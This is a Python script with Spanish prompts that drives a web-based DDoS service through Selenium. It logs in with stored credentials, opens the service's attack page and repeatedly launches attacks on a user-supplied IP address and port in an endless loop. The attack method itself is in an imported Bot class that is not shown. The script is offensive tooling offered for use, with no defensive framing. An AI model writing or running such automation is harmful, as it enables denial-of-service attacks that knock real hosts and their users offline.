from selenium import webdriver
from selenium.common.exceptions import *

import time
import traceback
from rich.console import Console
import logging
import threading

from bot import Bot
from config import Config
from utils.presets import Presets
import utils.start




config = Config()

main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.DEBUG)

presets = Presets(driver_type=config.driver)
service, options = presets.debug()












def get_user_input():
    console = Console()

    ip = console.input(f"Ingrese la dirección IP (por defecto: {config.attack['ip']}): ")
    if ip == "":
        ip = config.attack["ip"]

    port = console.input(f"Ingrese el puerto (por defecto: {config.attack['port']}): ")
    if port == "":
        port = config.attack["port"]

    return ip, port

ip, port = get_user_input()


main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.ERROR)



thr = []
x = 0



def main():
    
    try:
        driver = webdriver.Chrome(service=service, options=options)
        bot = Bot(
            driver=driver,
            main_logger=main_logger,
            username=config.account["username"],
            password=config.account["password"]
            )

    except AttributeError as e:
        raise e


    def main_loop():
        i = 1
        try:
            bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
            print(f"-----------------\nejecución: {i}\ncuenta: {config.account['username']}\n-----------------")
            time.sleep(config.attack["time"])
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except:
            main_logger.error(traceback.format_exc())
        finally:
            i = i + 1
            return
    try:
        try:
            bot.login_form()
            bot.DDoS_page()
            bot.close_button()
        except:
            raise Exception("error al logearse")
        time.sleep(5)
            
        while True:
            try:
                main_loop()
            except KeyboardInterrupt:
                raise KeyboardInterrupt
    finally:
        ...


main()





